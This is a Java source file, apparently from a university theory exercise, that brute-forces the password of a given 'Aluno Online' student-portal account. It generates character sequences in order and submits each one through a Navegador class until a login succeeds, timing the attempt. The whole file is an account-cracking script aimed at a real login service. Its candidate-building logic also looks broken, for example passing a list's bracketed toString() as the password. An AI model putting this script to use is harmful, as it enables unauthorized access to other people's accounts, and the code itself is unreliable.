package br.iesb.teoria;

import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class ForcaBruta {

    private static int N = 1;
    private static double initialTime;
    private static double interval;
    private static String usuario;

    public static void main(String[] args) throws Exception {
	FileWriter arq = new FileWriter(System.getProperty("user.dir") + "/src/br/iesb/teoria/resultados.txt", true);
	PrintWriter gravarArq = new PrintWriter(arq);
	Scanner sc = new Scanner(System.in);
	System.out.println("Login do Aluno Online: ");
	usuario = sc.next();
	initialTime = System.currentTimeMillis();
	crack();
	interval = System.currentTimeMillis() - initialTime;
	System.out.println("Tempo(seg): " + interval / 1000);
	gravarArq.println("Tempo(seg): " + interval / 1000);
	arq.close();
	sc.close();
    }

    private static void crack() {
	Integer i;
	List<Character> bam = new ArrayList<Character>();
	bam.add((char) 31);
	do {
	    i = 0;
	    nextChar(bam, i); // bam[i]++
	    while ((bam.get(i) == (char) 255) && (i < N)) {
		if (bam.get(N++ - 1) == (char) 255)
		    bam.add((char) 31);
		bam.set(i++, (char) 32);
		nextChar(bam, i);
	    }
	} while (!Navegador.start(Arrays.asList(usuario, bam.toString())));
	System.out.println(bam);
    }

    private static void nextChar(List<Character> bam, Integer i) {
	char temp = 0;
	temp = Character.valueOf(bam.get(i));
	temp = (char) (temp + 1);
	bam.set(i, temp);
    }

}
